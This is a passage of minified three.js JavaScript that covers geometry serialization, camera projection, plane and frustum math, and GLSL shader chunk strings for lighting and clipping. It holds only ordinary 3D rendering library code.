THREE.Mesh.",t)},mergeVertices:function(){var t,e={},i=[],n=[],r=Math.pow(10,4),a=0;for(t=this.vertices.length;a<t;a++){var o=this.vertices[a];void 0===e[o=Math.round(o.x*r)+"_"+Math.round(o.y*r)+"_"+Math.round(o.z*r)]?(e[o]=a,i.push(this.vertices[a]),n[a]=i.length-1):n[a]=n[e[o]]}for(e=[],a=0,t=this.faces.length;a<t;a++)for((r=this.faces[a]).a=n[r.a],r.b=n[r.b],r.c=n[r.c],r=[r.a,r.b,r.c],o=0;3>o;o++)if(r[o]===r[(o+1)%3]){e.push(a);break}for(a=e.length-1;0<=a;a--)for(r=e[a],this.faces.splice(r,1),n=0,t=this.faceVertexUvs.length;n<t;n++)this.faceVertexUvs[n].splice(r,1);return a=this.vertices.length-i.length,this.vertices=i,a},setFromPoints:function(t){this.vertices=[];for(var e=0,i=t.length;e<i;e++){var n=t[e];this.vertices.push(new r(n.x,n.y,n.z||0))}return this},sortFacesByMaterialIndex:function(){for(var t=this.faces,e=t.length,i=0;i<e;i++)t[i]._id=i;t.sort((function(t,e){return t.materialIndex-e.materialIndex}));var n,r,a=this.faceVertexUvs[0],o=this.faceVertexUvs[1];for(a&&a.length===e&&(n=[]),o&&o.length===e&&(r=[]),i=0;i<e;i++){var s=t[i]._id;n&&n.push(a[s]),r&&r.push(o[s])}n&&(this.faceVertexUvs[0]=n),r&&(this.faceVertexUvs[1]=r)},toJSON:function(){function t(t,e,i){return i?t|1<<e:t&~(1<<e)}function e(t){var e=t.x.toString()+t.y.toString()+t.z.toString();return void 0!==c[e]||(c[e]=l.length/3,l.push(t.x,t.y,t.z)),c[e]}function i(t){var e=t.r.toString()+t.g.toString()+t.b.toString();return void 0!==u[e]||(u[e]=h.length,h.push(t.getHex())),u[e]}function n(t){var e=t.x.toString()+t.y.toString();return void 0!==p[e]||(p[e]=d.length/2,d.push(t.x,t.y)),p[e]}var r={metadata:{version:4.5,type:"Geometry",generator:"Geometry.toJSON"}};if(r.uuid=this.uuid,r.type=this.type,""!==this.name&&(r.name=this.name),void 0!==this.parameters){var a,o=this.parameters;for(a in o)void 0!==o[a]&&(r[a]=o[a]);return r}for(o=[],a=0;a<this.vertices.length;a++){var s=this.vertices[a];o.push(s.x,s.y,s.z)}s=[];var l=[],c={},h=[],u={},d=[],p={};for(a=0;a<this.faces.length;a++){var f=this.faces[a],m=void 0!==this.faceVertexUvs[0][a],g=0<f.normal.length(),v=0<f.vertexNormals.length,y=1!==f.color.r||1!==f.color.g||1!==f.color.b,x=0<f.vertexColors.length,b=0;b=t(b,0,0),b=t(b,1,!0),b=t(b,2,!1),b=t(b,3,m),b=t(b,4,g),b=t(b,5,v),b=t(b,6,y),b=t(b,7,x),s.push(b),s.push(f.a,f.b,f.c),s.push(f.materialIndex),m&&(m=this.faceVertexUvs[0][a],s.push(n(m[0]),n(m[1]),n(m[2]))),g&&s.push(e(f.normal)),v&&(g=f.vertexNormals,s.push(e(g[0]),e(g[1]),e(g[2]))),y&&s.push(i(f.color)),x&&(f=f.vertexColors,s.push(i(f[0]),i(f[1]),i(f[2])))}return r.data={},r.data.vertices=o,r.data.normals=l,0<h.length&&(r.data.colors=h),0<d.length&&(r.data.uvs=[d]),r.data.faces=s,r},clone:function(){return(new U).copy(this)},copy:function(t){var e,i,n;this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingSphere=this.boundingBox=null,this.name=t.name;var r=t.vertices,a=0;for(e=r.length;a<e;a++)this.vertices.push(r[a].clone());for(a=0,e=(r=t.colors).length;a<e;a++)this.colors.push(r[a].clone());for(a=0,e=(r=t.faces).length;a<e;a++)this.faces.push(r[a].clone());for(a=0,e=t.faceVertexUvs.length;a<e;a++){var o=t.faceVertexUvs[a];for(void 0===this.faceVertexUvs[a]&&(this.faceVertexUvs[a]=[]),r=0,i=o.length;r<i;r++){var s=o[r],l=[],c=0;for(n=s.length;c<n;c++)l.push(s[c].clone());this.faceVertexUvs[a].push(l)}}for(a=0,e=(c=t.morphTargets).length;a<e;a++){if((n={}).name=c[a].name,void 0!==c[a].vertices)for(n.vertices=[],r=0,i=c[a].vertices.length;r<i;r++)n.vertices.push(c[a].vertices[r].clone());if(void 0!==c[a].normals)for(n.normals=[],r=0,i=c[a].normals.length;r<i;r++)n.normals.push(c[a].normals[r].clone());this.morphTargets.push(n)}for(a=0,e=(c=t.morphNormals).length;a<e;a++){if(n={},void 0!==c[a].vertexNormals)for(n.vertexNormals=[],r=0,i=c[a].vertexNormals.length;r<i;r++)o=c[a].vertexNormals[r],(s={}).a=o.a.clone(),s.b=o.b.clone(),s.c=o.c.clone(),n.vertexNormals.push(s);if(void 0!==c[a].faceNormals)for(n.faceNormals=[],r=0,i=c[a].faceNormals.length;r<i;r++)n.faceNormals.push(c[a].faceNormals[r].clone());this.morphNormals.push(n)}for(a=0,e=(r=t.skinWeights).length;a<e;a++)this.skinWeights.push(r[a].clone());for(a=0,e=(r=t.skinIndices).length;a<e;a++)this.skinIndices.push(r[a].clone());for(a=0,e=(r=t.lineDistances).length;a<e;a++)this.lineDistances.push(r[a]);return null!==(a=t.boundingBox)&&(this.boundingBox=a.clone()),null!==(a=t.boundingSphere)&&(this.boundingSphere=a.clone()),this.elementsNeedUpdate=t.elementsNeedUpdate,this.verticesNeedUpdate=t.verticesNeedUpdate,this.uvsNeedUpdate=t.uvsNeedUpdate,this.normalsNeedUpdate=t.normalsNeedUpdate,this.colorsNeedUpdate=t.colorsNeedUpdate,this.lineDistancesNeedUpdate=t.lineDistancesNeedUpdate,this.groupsNeedUpdate=t.groupsNeedUpdate,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),V.prototype=Object.create(U.prototype),V.prototype.constructor=V,W.prototype=Object.create(F.prototype),W.prototype.constructor=W;var us={clone:q,merge:X};Y.prototype=Object.create(T.prototype),Y.prototype.constructor=Y,Y.prototype.isShaderMaterial=!0,Y.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.fragmentShader=t.fragmentShader,this.vertexShader=t.vertexShader,this.uniforms=q(t.uniforms),this.defines=Object.assign({},t.defines),this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.lights=t.lights,this.clipping=t.clipping,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this.extensions=t.extensions,this},Y.prototype.toJSON=function(t){var e=T.prototype.toJSON.call(this,t);for(var i in e.uniforms={},this.uniforms){var n=this.uniforms[i].value;e.uniforms[i]=n&&n.isTexture?{type:"t",value:n.toJSON(t).uuid}:n&&n.isColor?{type:"c",value:n.getHex()}:n&&n.isVector2?{type:"v2",value:n.toArray()}:n&&n.isVector3?{type:"v3",value:n.toArray()}:n&&n.isVector4?{type:"v4",value:n.toArray()}:n&&n.isMatrix3?{type:"m3",value:n.toArray()}:n&&n.isMatrix4?{type:"m4",value:n.toArray()}:{value:n}}for(var r in 0<Object.keys(this.defines).length&&(e.defines=this.defines),e.vertexShader=this.vertexShader,e.fragmentShader=this.fragmentShader,t={},this.extensions)!0===this.extensions[r]&&(t[r]=!0);return 0<Object.keys(t).length&&(e.extensions=t),e},$.prototype=Object.assign(Object.create(p.prototype),{constructor:$,isCamera:!0,copy:function(t,e){return p.prototype.copy.call(this,t,e),this.matrixWorldInverse.copy(t.matrixWorldInverse),this.projectionMatrix.copy(t.projectionMatrix),this.projectionMatrixInverse.copy(t.projectionMatrixInverse),this},getWorldDirection:function(t){void 0===t&&(console.warn("THREE.Camera: .getWorldDirection() target is now required"),t=new r),this.updateMatrixWorld(!0);var e=this.matrixWorld.elements;return t.set(-e[8],-e[9],-e[10]).normalize()},updateMatrixWorld:function(t){p.prototype.updateMatrixWorld.call(this,t),this.matrixWorldInverse.getInverse(this.matrixWorld)},clone:function(){return(new this.constructor).copy(this)}}),Z.prototype=Object.assign(Object.create($.prototype),{constructor:Z,isPerspectiveCamera:!0,copy:function(t,e){return $.prototype.copy.call(this,t,e),this.fov=t.fov,this.zoom=t.zoom,this.near=t.near,this.far=t.far,this.focus=t.focus,this.aspect=t.aspect,this.view=null===t.view?null:Object.assign({},t.view),this.filmGauge=t.filmGauge,this.filmOffset=t.filmOffset,this},setFocalLength:function(t){t=.5*this.getFilmHeight()/t,this.fov=2*Ca.RAD2DEG*Math.atan(t),this.updateProjectionMatrix()},getFocalLength:function(){var t=Math.tan(.5*Ca.DEG2RAD*this.fov);return.5*this.getFilmHeight()/t},getEffectiveFOV:function(){return 2*Ca.RAD2DEG*Math.atan(Math.tan(.5*Ca.DEG2RAD*this.fov)/this.zoom)},getFilmWidth:function(){return this.filmGauge*Math.min(this.aspect,1)},getFilmHeight:function(){return this.filmGauge/Math.max(this.aspect,1)},setViewOffset:function(t,e,i,n,r,a){this.aspect=t/e,null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var t=this.near,e=t*Math.tan(.5*Ca.DEG2RAD*this.fov)/this.zoom,i=2*e,n=this.aspect*i,r=-.5*n,a=this.view;if(null!==this.view&&this.view.enabled){var o=a.fullWidth,s=a.fullHeight;r+=a.offsetX*n/o,e-=a.offsetY*i/s,n*=a.width/o,i*=a.height/s}0!==(a=this.filmOffset)&&(r+=t*a/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+n,e,e-i,t,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(t){return(t=p.prototype.toJSON.call(this,t)).object.fov=this.fov,t.object.zoom=this.zoom,t.object.near=this.near,t.object.far=this.far,t.object.focus=this.focus,t.object.aspect=this.aspect,null!==this.view&&(t.object.view=Object.assign({},this.view)),t.object.filmGauge=this.filmGauge,t.object.filmOffset=this.filmOffset,t}}),J.prototype=Object.create(p.prototype),J.prototype.constructor=J,K.prototype=Object.create(l.prototype),K.prototype.constructor=K,K.prototype.isWebGLRenderTargetCube=!0,K.prototype.fromEquirectangularTexture=function(t,e){this.texture.type=e.type,this.texture.format=e.format,this.texture.encoding=e.encoding;var i=new f,n=new Y({type:"CubemapFromEquirect",uniforms:q({tEquirect:{value:null}}),vertexShader:"varying vec3 vWorldDirection;\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n}\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}",fragmentShader:"uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#define RECIPROCAL_PI 0.31830988618\n#define RECIPROCAL_PI2 0.15915494\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV;\n\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\n\tgl_FragColor = texture2D( tEquirect, sampleUV );\n}",side:1,blending:0});return n.uniforms.tEquirect.value=e,e=new H(new W(5,5,5),n),i.add(e),(n=new J(1,10,1)).renderTarget=this,n.renderTarget.texture.name="CubeCameraTexture",n.update(t,i),e.geometry.dispose(),e.material.dispose(),this},Q.prototype=Object.create(o.prototype),Q.prototype.constructor=Q,Q.prototype.isDataTexture=!0;var ds=new r,ps=new r,fs=new a;Object.assign(tt.prototype,{isPlane:!0,set:function(t,e){return this.normal.copy(t),this.constant=e,this},setComponents:function(t,e,i,n){return this.normal.set(t,e,i),this.constant=n,this},setFromNormalAndCoplanarPoint:function(t,e){return this.normal.copy(t),this.constant=-e.dot(this.normal),this},setFromCoplanarPoints:function(t,e,i){return e=ds.subVectors(i,e).cross(ps.subVectors(t,e)).normalize(),this.setFromNormalAndCoplanarPoint(e,t),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.normal.copy(t.normal),this.constant=t.constant,this},normalize:function(){var t=1/this.normal.length();return this.normal.multiplyScalar(t),this.constant*=t,this},negate:function(){return this.constant*=-1,this.normal.negate(),this},distanceToPoint:function(t){return this.normal.dot(t)+this.constant},distanceToSphere:function(t){return this.distanceToPoint(t.center)-t.radius},projectPoint:function(t,e){return void 0===e&&(console.warn("THREE.Plane: .projectPoint() target is now required"),e=new r),e.copy(this.normal).multiplyScalar(-this.distanceToPoint(t)).add(t)},intersectLine:function(t,e){void 0===e&&(console.warn("THREE.Plane: .intersectLine() target is now required"),e=new r);var i=t.delta(ds),n=this.normal.dot(i);if(0===n){if(0===this.distanceToPoint(t.start))return e.copy(t.start)}else if(!(0>(n=-(t.start.dot(this.normal)+this.constant)/n)||1<n))return e.copy(i).multiplyScalar(n).add(t.start)},intersectsLine:function(t){var e=this.distanceToPoint(t.start);return t=this.distanceToPoint(t.end),0>e&&0<t||0>t&&0<e},intersectsBox:function(t){return t.intersectsPlane(this)},intersectsSphere:function(t){return t.intersectsPlane(this)},coplanarPoint:function(t){return void 0===t&&(console.warn("THREE.Plane: .coplanarPoint() target is now required"),t=new r),t.copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(t,e){return e=e||fs.getNormalMatrix(t),t=this.coplanarPoint(ds).applyMatrix4(t),e=this.normal.applyMatrix3(e).normalize(),this.constant=-t.dot(e),this},translate:function(t){return this.constant-=t.dot(this.normal),this},equals:function(t){return t.normal.equals(this.normal)&&t.constant===this.constant}});var ms=new v,gs=new r;Object.assign(et.prototype,{set:function(t,e,i,n,r,a){var o=this.planes;return o[0].copy(t),o[1].copy(e),o[2].copy(i),o[3].copy(n),o[4].copy(r),o[5].copy(a),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){for(var e=this.planes,i=0;6>i;i++)e[i].copy(t.planes[i]);return this},setFromMatrix:function(t){var e=this.planes,i=t.elements;t=i[0];var n=i[1],r=i[2],a=i[3],o=i[4],s=i[5],l=i[6],c=i[7],h=i[8],u=i[9],d=i[10],p=i[11],f=i[12],m=i[13],g=i[14];return i=i[15],e[0].setComponents(a-t,c-o,p-h,i-f).normalize(),e[1].setComponents(a+t,c+o,p+h,i+f).normalize(),e[2].setComponents(a+n,c+s,p+u,i+m).normalize(),e[3].setComponents(a-n,c-s,p-u,i-m).normalize(),e[4].setComponents(a-r,c-l,p-d,i-g).normalize(),e[5].setComponents(a+r,c+l,p+d,i+g).normalize(),this},intersectsObject:function(t){var e=t.geometry;return null===e.boundingSphere&&e.computeBoundingSphere(),ms.copy(e.boundingSphere).applyMatrix4(t.matrixWorld),this.intersectsSphere(ms)},intersectsSprite:function(t){return ms.center.set(0,0,0),ms.radius=.7071067811865476,ms.applyMatrix4(t.matrixWorld),this.intersectsSphere(ms)},intersectsSphere:function(t){var e=this.planes,i=t.center;t=-t.radius;for(var n=0;6>n;n++)if(e[n].distanceToPoint(i)<t)return!1;return!0},intersectsBox:function(t){for(var e=this.planes,i=0;6>i;i++){var n=e[i];if(gs.x=0<n.normal.x?t.max.x:t.min.x,gs.y=0<n.normal.y?t.max.y:t.min.y,gs.z=0<n.normal.z?t.max.z:t.min.z,0>n.distanceToPoint(gs))return!1}return!0},containsPoint:function(t){for(var e=this.planes,i=0;6>i;i++)if(0>e[i].distanceToPoint(t))return!1;return!0}});var vs={alphamap_fragment:"#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n#endif",alphamap_pars_fragment:"#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",alphatest_fragment:"#ifdef ALPHATEST\n\tif ( diffuseColor.a < ALPHATEST ) discard;\n#endif",aomap_fragment:"#ifdef USE_AOMAP\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\t#if defined( USE_ENVMAP ) && defined( STANDARD )\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\n\t#endif\n#endif",aomap_pars_fragment:"#ifdef USE_AOMAP\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n#endif",begin_vertex:"vec3 transformed = vec3( position );",beginnormal_vertex:"vec3 objectNormal = vec3( normal );\n#ifdef USE_TANGENT\n\tvec3 objectTangent = vec3( tangent.xyz );\n#endif",bsdfs:"vec2 integrateSpecularBRDF( const in float dotNV, const in float roughness ) {\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\tvec4 r = roughness * c0 + c1;\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\treturn vec2( -1.04, 1.04 ) * a004 + r.zw;\n}\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\tif( cutoffDistance > 0.0 ) {\n\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\t}\n\treturn distanceFalloff;\n#else\n\tif( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\t\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\t}\n\treturn 1.0;\n#endif\n}\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\n\treturn RECIPROCAL_PI * diffuseColor;\n}\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\n\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\n}\nvec3 F_Schlick_RoughnessDependent( const in vec3 F0, const in float dotNV, const in float roughness ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotNV - 6.98316 ) * dotNV );\n\tvec3 Fr = max( vec3( 1.0 - roughness ), F0 ) - F0;\n\treturn Fr * fresnel + F0;\n}\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\treturn 1.0 / ( gl * gv );\n}\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\treturn 0.5 / max( gv + gl, EPSILON );\n}\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\tfloat a2 = pow2( alpha );\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n}\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat alpha = pow2( roughness );\n\tvec3 halfDir = normalize( incidentLight.direction + viewDir );\n\tfloat dotNL = saturate( dot( normal, incidentLight.direction ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\tfloat D = D_GGX( alpha, dotNH );\n\treturn F * ( G * D );\n}\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\tconst float LUT_SIZE  = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS  = 0.5 / LUT_SIZE;\n\tfloat dotNV = saturate( dot( N, V ) );\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\treturn uv;\n}\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\tfloat l = length( f );\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n}\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\tfloat x = dot( v1, v2 );\n\tfloat y = abs( x );\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\treturn cross( v1, v2 ) * theta_sintheta;\n}\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 );\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n}\nvec3 BRDF_Specular_GGX_Environment( const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\treturn specularColor * brdf.x + brdf.y;\n}\nvoid BRDF_Specular_Multiscattering_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tvec3 F = F_Schlick_RoughnessDependent( specularColor, dotNV, roughness );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\tvec3 FssEss = F * brdf.x + brdf.y;\n\tfloat Ess = brdf.x + brdf.y;\n\tfloat Ems = 1.0 - Ess;\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619;\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n}\nfloat G_BlinnPhong_Implicit( ) {\n\treturn 0.25;\n}\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n}\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_BlinnPhong_Implicit( );\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\treturn F * ( G * D );\n}\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\n\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\n}\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\n\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\n}\n#if defined( USE_SHEEN )\nfloat D_Charlie(float roughness, float NoH) {\n\tfloat invAlpha  = 1.0 / roughness;\n\tfloat cos2h = NoH * NoH;\n\tfloat sin2h = max(1.0 - cos2h, 0.0078125);\treturn (2.0 + invAlpha) * pow(sin2h, invAlpha * 0.5) / (2.0 * PI);\n}\nfloat V_Neubelt(float NoV, float NoL) {\n\treturn saturate(1.0 / (4.0 * (NoL + NoV - NoL * NoV)));\n}\nvec3 BRDF_Specular_Sheen( const in float roughness, const in vec3 L, const in GeometricContext geometry, vec3 specularColor ) {\n\tvec3 N = geometry.normal;\n\tvec3 V = geometry.viewDir;\n\tvec3 H = normalize( V + L );\n\tfloat dotNH = saturate( dot( N, H ) );\n\treturn specularColor * D_Charlie( roughness, dotNH ) * V_Neubelt( dot(N, V), dot(N, L) );\n}\n#endif",bumpmap_pars_fragment:"#ifdef USE_BUMPMAP\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\tvec2 dHdxy_fwd() {\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\t\treturn vec2( dBx, dBy );\n\t}\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\t\tfloat fDet = dot( vSigmaX, R1 );\n\t\tfDet *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\t}\n#endif",clipping_planes_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvec4 plane;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\n\t}\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\t\tbool clipped = true;\n\t\t#pragma unroll_loop\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\n\t\t}\n\t\tif ( clipped ) discard;\n\t#endif\n#endif",clipping_planes_pars_fragment:"#if NUM_CLIPPING_PLANES > 0\n\t#if ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\t\tvarying vec3 vViewPosition;\n\t#endif\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n#endif",clipping_planes_pars_vertex:"#if NUM_CLIPPING_PLANES > 0 && ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvarying vec3 vViewPosition;\n#endif",clipping_planes_vertex:"#if NUM_CLIPPING_PLANES > 0 && ! defined( STANDARD ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif",color_fragment:"#ifdef USE_COLOR\n\tdiffuseColor.rgb *= vColor;\n#endif",color_pars_fragment:"#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif",color_pars_vertex:"#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif",color_vertex:"#ifdef USE_COLOR\n\tvColor.xyz = color.xyz;\n#endif",common:"#define PI 3.14159265359\n#define PI2 6.28318530718\n#define PI_HALF 1.5707963267949\n#define RECIPROCAL_PI 0.31830988618\n#define RECIPROCAL_PI2 0.15915494\n#define LOG2 1.442695\n#define EPSILON 1e-6\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#define whiteComplement(a) ( 1.0 - saturate( a ) )\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\nhighp float rand( const in 